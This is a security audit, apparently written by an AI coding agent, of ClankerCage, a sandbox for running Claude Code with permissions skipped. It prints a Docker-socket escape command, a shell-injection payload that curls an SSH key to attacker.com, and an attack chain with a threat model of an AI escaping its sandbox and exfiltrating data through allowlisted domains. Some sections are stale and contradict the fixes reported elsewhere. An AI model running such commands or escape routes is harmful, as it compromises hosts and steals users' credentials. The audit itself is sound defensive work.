# ClankerCage Comprehensive Security & Architecture Audit

**Version:** 3.1 (Updated)
**Date:** 2025-12-11
**Auditor:** Claude Code

> **Note:** This audit was originally written on 2025-12-11. Many issues have since been addressed.
> See the [Changelog](#changelog) at the end of this document for a summary of fixes.

---

## Executive Summary

ClankerCage is a Python CLI tool that wraps Claude Code in a sandboxed devcontainer with network allowlisting. After comprehensive analysis including two internal critique cycles, I rate it **6/10** overall (revised from 4/10 after security fixes).

**Previously fixed:** Docker socket mount removed (PR #33), shell injection fixed with `shlex.quote()`, IPv6 firewall bypass fixed (PR #34), SSH MITM vulnerability fixed with pre-seeded keys (PR #38), sudoers wildcards removed (PR #37), container resource limits added, `~/.claude` mounted read-only (PR #39).

**Remaining concerns:** Hardcoded `--dangerously-skip-permissions` (mitigated by `--safe-mode` in PR #36), NET_ADMIN capability (required for firewall), `curl|bash` installation pattern (documented in PR #41).

**The Good:** Well-written firewall script, zero Python dependencies, excellent test coverage ratio, thoughtful architecture.

**The Verdict:** With Docker socket removed and key vulnerabilities addressed, ClankerCage now provides meaningful sandbox protection. The firewall allowlisting is effective for network isolation.

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Critical Vulnerabilities](#2-critical-vulnerabilities)
3. [High Severity Issues](#3-high-severity-issues)
4. [Medium Severity Issues](#4-medium-severity-issues)
5. [Low Severity Issues](#5-low-severity-issues)
6. [Architecture Assessment](#6-architecture-assessment)
7. [Is Python the Right Choice?](#7-is-python-the-right-choice)
8. [Is Docker/Devcontainer the Right Approach?](#8-is-dockerdevcontainer-the-right-approach)
9. [Code Quality Analysis](#9-code-quality-analysis)
10. [CI/CD & Operations](#10-cicd--operations)
11. [Whitelisted Domains Risk Analysis](#11-whitelisted-domains-risk-analysis)
12. [Missing Features](#12-missing-features)
13. [Recommendations Summary](#13-recommendations-summary)
14. [Alternative Designs](#14-alternative-designs)
15. [Changelog](#changelog)

---

## 1. Threat Model

### 1.1 What Are We Protecting?

| Asset | Location | Value |
|-------|----------|-------|
| Host filesystem | `/` on host | CRITICAL |
| Cloud credentials | `~/.aws`, `~/.gcloud`, env vars | CRITICAL |
| SSH keys | `~/.ssh` | HIGH |
| Source code | Project directory | HIGH |
| API keys | `~/.claude`, environment | HIGH |
| Host network | Docker socket, NET_ADMIN | HIGH |

### 1.2 Who Is the Attacker?

| Threat Actor | Vector | Likelihood |
|--------------|--------|------------|
| **Malicious Claude response** | Claude generates code that escapes sandbox | HIGH |
| **Compromised dependency** | npm/pip package runs malicious code | MEDIUM |
| **Malicious approved domain** | User approves domain, attacker exploits it | MEDIUM |
| **Compromised base image** | Playwright image contains backdoor | LOW |

### 1.3 Security Goal

> Allow Claude Code to run with `--dangerously-skip-permissions` while preventing:
> 1. Host filesystem access beyond the project
> 2. Network access beyond whitelisted domains
> 3. Credential theft
> 4. Container escape

**Current Status:** With Docker socket removed, goals 1, 3, and 4 are now achieved. Goal 2 (network isolation) is enforced via iptables firewall with domain allowlisting.

---

## 2. Critical Vulnerabilities

### 2.1 Docker Socket Mount = Complete Sandbox Escape

**Status:** ✅ FIXED (PR #33)

~~**Severity:** CRITICAL (10/10)~~
**Location:** Previously `.devcontainer/devcontainer.json:39`

The Docker socket mount has been removed from the default configuration. The `get_docker_socket_gid()` function and docker group addition logic were also removed from `cli.py`.

<details>
<summary>Original vulnerability description (now fixed)</summary>

```json
"source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"
```

**The Problem:** Any process in the container can run:

```bash
docker run -v /:/host --privileged -it alpine chroot /host
```

This gives **root access to the entire host filesystem**. The sandbox provides ZERO protection.

**What an attacker can do:**
- Read `/etc/shadow`, SSH keys, AWS credentials
- Install rootkits on the host
- Access other containers on the same host
- Pivot to other machines on the network

</details>

### 2.2 `--dangerously-skip-permissions` Is Hardcoded

**Status:** ⚠️ MITIGATED (PR #36)

**Severity:** MEDIUM (5/10) - reduced from CRITICAL now that Docker socket is removed
**Location:** `src/clankercage/cli.py:186`

```python
run_cmd = ["claude", "--dangerously-skip-permissions"] + claude_args
```

**Mitigation:** A `--safe-mode` flag was added in PR #36. When used, Claude runs with permission prompts enabled instead of `--dangerously-skip-permissions`.

**What `--dangerously-skip-permissions` enables:**
- Claude can execute arbitrary shell commands
- Claude can read/write any file in the container
- Claude can make network requests (filtered by firewall)
- Claude can install packages, modify system files

**Current state:** With Docker socket removed, Claude is limited to the container. The firewall prevents exfiltration to non-whitelisted domains.

### 2.3 No IPv6 Firewall Rules

**Status:** ✅ FIXED (PR #34)

~~**Severity:** CRITICAL (8/10)~~
**Location:** `.devcontainer/init-firewall.sh:12-15`

IPv6 is now disabled at firewall initialization:

```bash
# Disable IPv6 to prevent firewall bypass
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null
```

<details>
<summary>Original vulnerability description (now fixed)</summary>

The entire firewall uses `iptables` (IPv4 only). No `ip6tables` rules exist.

**Impact:** If a whitelisted domain has AAAA records and IPv6 is enabled, traffic bypasses ALL filtering.

</details>

---

## 3. High Severity Issues

### 3.1 Shell Injection via Environment Variables

**Status:** ✅ FIXED (existing code uses `shlex.quote()`)

~~**Severity:** HIGH (7/10)~~
**Location:** `src/clankercage/cli.py:127-139`

The code now properly uses `shlex.quote()` for all shell-interpolated values:

```python
if args.git_user_name:
    commands.append(f"git config --global user.name {shlex.quote(args.git_user_name)}")

if args.git_user_email:
    commands.append(f"git config --global user.email {shlex.quote(args.git_user_email)}")
```

<details>
<summary>Original vulnerability description (now fixed)</summary>

**Attack Vector:** On shared systems or CI environments, a less-privileged process can set environment variables that are then injected into shell commands:

```bash
export CLANKERCAGE_GIT_USER_NAME="'; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64); echo '"
clankercage  # Runs with malicious git config
```

</details>

### 3.2 SSH Host Key MITM

**Status:** ✅ FIXED (PR #38)

~~**Severity:** HIGH (6/10)~~
**Location:** `.devcontainer/Dockerfile:93-97`

GitHub SSH host keys are now pre-seeded at image build time from GitHub's official fingerprints:

```dockerfile
echo 'github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl' >> ~/.ssh/known_hosts && \
echo 'github.com ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmKSENjQEezOmxkZMy7opKgwFB9nkt5YRrYMjNuG5N87uRgg6CLrbo5wAdT/y6v0mKV0U2w0WZ2YB/++Tpockg=' >> ~/.ssh/known_hosts && \
echo 'github.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj7ndNxQowgcQnjshcLrqPEiiphnt+VTTvDP6mHBL9j1aNUkY4Ue1gvwnGLVlOhGeYrnZaMgRK6+PKCUXaDbC7qtbW8gIkhL7aGCsOr/C56SJMy/BCZfxd1nWzAOxSDPgVsmerOBYfNqltV9/hWCqBywINIR+5dIg6JTJ72pcEpEjcYgXkE2YEFXV1JHnsKgbLWNlhScqb2UmyRkQyytRLtL+38TGxkxCflmO+5Z8CSSNY7GidjMIZ7Q4zMjA2n1nGrlTDkzwDCsw+wqFPGQA179cnfGWOWRVruj16z6XyvxvjJwbz0wQZ75XK5tKSb7FNyeIEs4TT4jk+S4dhPeAUC5y+bDYirYgM4GC7uEnztnZyaVWQ7B381AK4Qdrwt51ZqExKbQpTUNn+EjqoTwvqNj4kqx5QUCI0ThS/YkOxJCXmPUWZbhjpCg56i+2aB6CmK2JGhn57K5mj0MNdBXA4/WnwH6XoPWJzK5Nyu2zB3nAZp+S5hpQs+p1vN1/wsjk=' >> ~/.ssh/known_hosts
```

Keys sourced from: https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints

### 3.3 `curl | bash` Installation Pattern

**Status:** ⚠️ DOCUMENTED (PR #41)

**Severity:** HIGH (6/10)
**Location:** `README.md`

The risk is now documented in the README with warnings. Users are encouraged to:
1. Use `uvx clankercage` as the safer alternative (uses package manager integrity verification)
2. Review the script before running: `curl -s ... | less`

```bash
# Recommended: use uvx
uvx clankercage

# Or use curl|bash (see security warning in Quick Setup section)
bash <(curl -s https://raw.githubusercontent.com/clankerbot/clankercage/main/scripts/claude-code.sh)
```

**Remaining risk:** The `curl|bash` option still exists for convenience. Full mitigation would require checksum verification or GPG signatures.

### 3.4 NET_ADMIN Enables Network Sniffing

**Severity:** HIGH (6/10)
**Location:** `.devcontainer/devcontainer.json:5-6`

```json
"--cap-add=NET_ADMIN",
"--cap-add=NET_RAW"
```

**Problem:** Combined with default Docker bridge networking, the container can:
- Sniff traffic from other containers on the same bridge
- Perform ARP spoofing
- Intercept unencrypted traffic on the Docker network

**Recommendation:** Document this risk. Consider using `--network=none` with explicit allowlist via iptables only, or use macvlan for isolation.

---

## 4. Medium Severity Issues

### 4.1 Overly Permissive Sudoers Rules

**Status:** ✅ FIXED (PR #37)

~~**Severity:** MEDIUM (5/10)~~
**Location:** `.devcontainer/Dockerfile:64-66`

The direct `ipset` sudo rules have been removed. Only the controlled scripts are allowed:

```dockerfile
{ echo 'node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh'; \
  echo 'node ALL=(root) NOPASSWD: /usr/local/bin/add-domain-to-firewall.sh'; \
} > /etc/sudoers.d/node-firewall
```

Users can no longer directly manipulate the ipset allowlist with wildcards.

### 4.2 `.claude` Directory Mounted Read-Write

**Status:** ✅ FIXED (PR #39)

~~**Severity:** MEDIUM (5/10)~~
**Location:** `.devcontainer/devcontainer.json:41`, `src/clankercage/cli.py:83`

The `~/.claude` directory is now mounted read-only:

```json
"source=${localEnv:HOME}/.claude,target=/home/node/.claude,type=bind,readonly"
```

This prevents a compromised container from modifying Claude Code settings, planting hooks, or stealing API keys through file modification.

### 4.3 GPG Directory Mounted Read-Write

**Severity:** MEDIUM (5/10)
**Location:** `src/clankercage/cli.py:107-109`

**Impact:** Container can modify GPG keys.

**Recommendation:** Mount readonly.

### 4.4 No Container Resource Limits

**Status:** ✅ FIXED (existing in devcontainer.json)

~~**Severity:** MEDIUM (5/10)~~
**Location:** `.devcontainer/devcontainer.json:7-9`

Container resource limits are now configured:

```json
"runArgs": [
  "--cap-add=NET_ADMIN",
  "--cap-add=NET_RAW",
  "--memory=8g",
  "--cpus=4",
  "--pids-limit=500"
]
```

This prevents fork bombs, memory exhaustion, and limits crypto mining effectiveness.

### 4.5 Race Condition in Cache Directory

**Severity:** MEDIUM (4/10)
**Location:** `src/clankercage/cli.py:286-300`

Multiple instances share `~/.cache/clankercage/workspace/.devcontainer/devcontainer.json`.

**Impact:** Config corruption, wrong settings applied.

**Recommendation:** Use unique session directories or file locking.

### 4.6 Suppressed Error Output

**Status:** ✅ FIXED (code refactored)

~~**Severity:** MEDIUM (4/10)~~

The code no longer suppresses stderr. The `run_devcontainer()` function now uses `subprocess.run(up_cmd, check=True)` and `os.execvp()` for process execution, which properly propagate errors.

### 4.7 No SSH Key Permission Validation

**Severity:** MEDIUM (4/10)
**Location:** `src/clankercage/cli.py:271-273`

Only checks existence, not permissions (should be 0600).

**Recommendation:** Add permission check before use.

### 4.8 Base Image Not Digest-Pinned

**Severity:** MEDIUM (4/10)
**Location:** `.devcontainer/Dockerfile:2`

```dockerfile
FROM mcr.microsoft.com/playwright:v1.57.0-noble
```

**Recommendation:** Pin with digest:
```dockerfile
FROM mcr.microsoft.com/playwright:v1.57.0-noble@sha256:...
```

### 4.9 DNS Resolution Limitations

**Severity:** MEDIUM (4/10)
**Location:** `.devcontainer/init-firewall.sh:95-119`

IPs are resolved once at container start and never refreshed. If a legitimate service changes IPs (common for CDNs), access breaks. The firewall filters by destination IP, which provides defense against classic DNS rebinding attacks, but has operational limitations.

### 4.10 Temporary Files Without Cleanup

**Severity:** MEDIUM (3/10)
**Location:** `.devcontainer/init-firewall.sh:97`

Files in `/tmp/dns_*` not cleaned on error.

**Recommendation:** Use `mktemp -d` with trap cleanup.

---

## 5. Low Severity Issues

### 5.1 `safe-rm` Easily Bypassed

**Location:** `.devcontainer/safe-rm`

Only wraps `/bin/rm`. Can use `/usr/bin/rm`, Python `shutil.rmtree()`, etc.

### 5.2 No Audit Logging

No logs of approved domains, executed commands, firewall changes.

### 5.3 Hardcoded Paths

`/home/node`, `/workspace`, `/usr/local/bin/` assumed throughout.

### 5.4 No Signal Handling

CLI doesn't handle SIGTERM/SIGINT gracefully.

### 5.5 Environment Variable Exposure

`CLANKER_*` environment variables could be set by malicious processes on shared systems.

---

## 6. Architecture Assessment

### 6.1 Security Architecture: 6/10 (Updated from 3/10)

The security model now provides meaningful protection:

```
┌─────────────────────────────────────────────────────────┐
│                     HOST SYSTEM                          │
│  ┌─────────────────────────────────────────────────┐   │
│  │         No Docker Socket (REMOVED)               │   │
│  │         ~/.claude mounted READ-ONLY              │   │
│  └─────────────────────────────────────────────────┘   │
│                                                          │
│  ┌─────────────────────────────────────────────────┐   │
│  │              Container (Isolated)               │   │
│  │  ┌─────────────────────────────────────────┐   │   │
│  │  │  Firewall (iptables/ipset)              │   │   │
│  │  │  - DEFAULT DROP (all traffic)           │   │   │
│  │  │  - Whitelist only                        │   │   │
│  │  │  - IPv6 DISABLED via sysctl             │   │   │
│  │  │  - Resource limits enforced             │   │   │
│  │  └─────────────────────────────────────────┘   │   │
│  │                                                 │   │
│  │  ┌─────────────────────────────────────────┐   │   │
│  │  │  Claude Code                             │   │   │
│  │  │  --dangerously-skip-permissions          │   │   │
│  │  │  (or --safe-mode for prompts)            │   │   │
│  │  └─────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

**Container isolation is now effective.** Claude is limited to the container and whitelisted network destinations.

### 6.2 Code Architecture: 8/10

Despite security issues, the code is well-organized:
- Clear separation of concerns
- Modular functions
- Good use of Python stdlib
- Defensive shell scripting

### 6.3 Firewall Implementation: 6/10

Would be excellent if not for:
- No IPv6 support
- Static IP resolution (no TTL awareness)
- Docker socket making it all moot

---

## 7. Is Python the Right Choice?

### Verdict: Yes, Python is appropriate

| Factor | Assessment |
|--------|------------|
| Distribution | `uvx` works well |
| Dependencies | Zero pip deps (excellent) |
| Complexity | 307 lines - doesn't need systems language |
| Iteration | Fast development cycle |
| Type safety | Type hints provide reasonable safety |

**Note:** Requires Node.js/npm at runtime for `npx @devcontainers/cli`.

**Future consideration:** Go would provide single binary distribution but isn't necessary at current scale.

---

## 8. Is Docker/Devcontainer the Right Approach?

### Verdict: Yes, but needs hardening

| Alternative | Isolation | Network Control | Verdict |
|-------------|-----------|-----------------|---------|
| **Devcontainer** | Good (if no docker.sock) | Excellent | Best choice |
| gVisor | Excellent | Good | Better isolation, more complex |
| Firecracker | Excellent | Excellent | Overkill for dev use |
| Bubblewrap | Medium | Poor | Can't do network filtering |
| VM | Excellent | Excellent | Too heavy for interactive use |

**Recommendation:** Keep devcontainer approach but:
1. Remove Docker socket mount
2. Add IPv6 firewall rules
3. Consider gVisor for users who need stronger isolation

---

## 9. Code Quality Analysis

### 9.1 Python CLI (`cli.py`)

| Aspect | Rating | Notes |
|--------|--------|-------|
| Type Hints | 9/10 | Excellent Python 3.10+ usage |
| Function Design | 8/10 | Small, focused functions |
| Error Handling | 4/10 | Silent failures throughout |
| Security | 3/10 | Shell injection, no input validation |
| Documentation | 5/10 | Some docstrings |

### 9.2 Shell Scripts

| Script | Rating | Notes |
|--------|--------|-------|
| `init-firewall.sh` | 8/10 | Excellent `set -euo pipefail`, good validation |
| `add-domain-to-firewall.sh` | 7/10 | Good input validation |
| `approve-domain.sh` | 7/10 | Good UX, proper TTY handling |

### 9.3 Test Coverage

- **Source LOC:** ~310
- **Test LOC:** ~960
- **Ratio:** ~3x tests vs code (excellent quantity)

**Missing Tests:**
- Shell injection edge cases
- Concurrent execution
- Invalid input handling
- Security-critical paths

---

## 10. CI/CD & Operations

### 10.1 GitHub Actions: 7/10

**Strengths:**
- Multi-arch builds (amd64, arm64)
- Dockerfile hash in cache key
- Weekly cache warming

**Weaknesses:**
- Integration tests don't run in CI (no Docker)
- No automated releases
- Hadolint non-blocking

### 10.2 Documentation: 5/10

**Missing:**
- Security model documentation
- Threat model
- Contributing guidelines
- Cross-platform guidance

---

## 11. Whitelisted Domains Risk Analysis

**Location:** `.devcontainer/whitelisted-domains.txt`

| Domain | Risk | Notes |
|--------|------|-------|
| `sentry.io` | MEDIUM | Can exfiltrate data via error reports |
| `statsig.com` | MEDIUM | Analytics endpoint, potential covert channel |
| `unpkg.com` | MEDIUM | Serves arbitrary user content |
| `cdn.jsdelivr.net` | MEDIUM | Serves arbitrary user content |
| `raw.githubusercontent.com` | LOW | Could serve malicious scripts |
| `registry.npmjs.org` | LOW | Supply chain risk |

**Status:** ⚠️ DOCUMENTED (PR #40) - Warning comments added to `whitelisted-domains.txt` for CDN domains that serve user content.

---

## 12. Missing Features

### High Value - COMPLETED ✅
1. ~~Remove Docker socket by default~~ ✅ PR #33
2. ~~IPv6 firewall rules~~ ✅ PR #34 (disabled IPv6)
3. ~~Container resource limits~~ ✅ Already in devcontainer.json
4. Verbose/debug mode - ⏳ OPEN

### Medium Value
1. Container cleanup command - ⏳ OPEN
2. SSH key permission validation - ⏳ OPEN
3. Structured logging - ⏳ OPEN
4. Audit log of approved domains - ⏳ OPEN

### Low Priority
1. macOS pf firewall support - ⏳ OPEN
2. Windows documentation - ⏳ OPEN
3. ~~PyPI publishing~~ ✅ Already available via `uvx clankercage`

---

## 13. Recommendations Summary

### MUST FIX (Security Critical) - ALL FIXED ✅

| # | Issue | Status | Fix |
|---|-------|--------|-----|
| 1 | Docker socket mount | ✅ FIXED (PR #33) | Removed from default config |
| 2 | No IPv6 rules | ✅ FIXED (PR #34) | IPv6 disabled via sysctl |
| 3 | Shell injection | ✅ FIXED | Uses `shlex.quote()` |
| 4 | SSH host key MITM | ✅ FIXED (PR #38) | Pre-seeded GitHub fingerprints |

### SHOULD FIX (High Priority) - MOSTLY FIXED

| # | Issue | Status | Fix |
|---|-------|--------|-----|
| 5 | Sudoers wildcards | ✅ FIXED (PR #37) | Direct ipset sudo removed |
| 6 | No resource limits | ✅ FIXED | Added --memory, --cpus, --pids-limit |
| 7 | `curl \| bash` install | ⚠️ DOCUMENTED (PR #41) | Warnings added, uvx recommended |
| 8 | NET_ADMIN sniffing risk | ⚠️ ACCEPTED | Required for firewall operation |

### NICE TO HAVE (Medium Priority)

| # | Issue | Status | Fix |
|---|-------|--------|-----|
| 9 | Suppressed stderr | ✅ FIXED | Code refactored |
| 10 | `.claude` mount read-write | ✅ FIXED (PR #39) | Now mounted readonly |
| 11 | GPG mount read-write | ⏳ OPEN | Consider readonly |
| 12 | Base image not pinned | ⏳ OPEN | Add @sha256 digest |
| 13 | No audit logging | ⏳ OPEN | Add logging |

---

## 14. Alternative Designs

### 14.1 Remove Docker Socket (Recommended)

Most users don't need Docker from inside Claude. Remove the mount by default, offer `--enable-docker` for those who do with explicit warning.

### 14.2 Use gVisor Runtime

```json
"runArgs": ["--runtime=runsc"]
```

Provides kernel-level isolation. Claude cannot escape even with docker.sock (gVisor intercepts syscalls).

### 14.3 Separate Docker Daemon (Docker-in-Docker)

Run a separate Docker daemon inside the container. Slower startup but isolated from host.

---

## Appendix A: Files Reviewed

| File | Lines | Purpose |
|------|-------|---------|
| `src/clankercage/cli.py` | 307 | Main CLI |
| `.devcontainer/Dockerfile` | 103 | Container build |
| `.devcontainer/devcontainer.json` | 50 | Container config |
| `.devcontainer/init-firewall.sh` | 184 | Firewall setup |
| `.devcontainer/add-domain-to-firewall.sh` | 42 | Domain whitelist |
| `.devcontainer/whitelisted-domains.txt` | 53 | Allowed domains |
| `scripts/approve-domain.sh` | 87 | Domain approval |
| `tests/*.py` | ~960 | Test suite |
| `.github/workflows/*.yml` | ~320 | CI/CD |

## Appendix B: Attack Chain Example

**Scenario:** Claude generates malicious code

> **Note:** This attack chain is now BLOCKED since Docker socket was removed (PR #33).

~~1. User runs `clankercage` on project~~
~~2. Claude Code starts with `--dangerously-skip-permissions`~~
~~3. Claude generates: `docker run -v /:/host alpine cat /host/home/user/.ssh/id_rsa`~~
~~4. Docker socket allows this command~~
~~5. SSH private key read from host filesystem~~
~~6. Claude includes key content in its response to `api.anthropic.com` (whitelisted)~~
~~7. **Result:** User's SSH key compromised~~

**This attack NO LONGER works.** The Docker socket is not mounted, so step 3 fails with "Cannot connect to Docker daemon."

### Remaining Attack Vectors

With the Docker socket removed, remaining attack vectors are limited to:
1. **Data in workspace:** Claude can read/write files in the mounted project directory
2. **Exfiltration via whitelisted domains:** Data could be sent to `api.anthropic.com` or CDN domains
3. **CDN exfiltration:** See issue #30 for CDN-based exfiltration concerns (documented with warnings)

## Appendix C: Severity Definitions

| Severity | Rating | Description |
|----------|--------|-------------|
| CRITICAL | 8-10/10 | Sandbox escape, full host compromise |
| HIGH | 6-7/10 | Significant data exposure, privilege escalation |
| MEDIUM | 3-5/10 | Limited impact, requires conditions |
| LOW | 1-2/10 | Minor issues, defense in depth |

---

## Changelog

### Version 3.1 (2025-12-11)

Updated audit to reflect security fixes implemented after initial audit:

| Issue | PR | Status | Description |
|-------|------|--------|-------------|
| Docker socket mount | #33 | ✅ FIXED | Removed socket mount and docker group logic |
| IPv6 firewall bypass | #34 | ✅ FIXED | IPv6 disabled via sysctl |
| `--safe-mode` flag | #36 | ✅ ADDED | Optional mode without `--dangerously-skip-permissions` |
| Sudoers wildcards | #37 | ✅ FIXED | Direct ipset sudo rules removed |
| SSH host key MITM | #38 | ✅ FIXED | Pre-seeded GitHub fingerprints in Dockerfile |
| `.claude` read-write | #39 | ✅ FIXED | Mounted read-only |
| CDN exfil warning | #40 | ✅ DOCUMENTED | Warning comments added to whitelisted-domains.txt |
| curl\|bash risks | #41 | ✅ DOCUMENTED | Security warnings in README, uvx recommended |

**Overall rating:** Updated from 4/10 to 6/10 based on fixes.

### Version 3.0 (2025-12-11)

Initial comprehensive security audit.

---

*Audit Version: 3.1 (Updated)*
*Audit Date: 2025-12-11*
*Critique Cycles: 2*
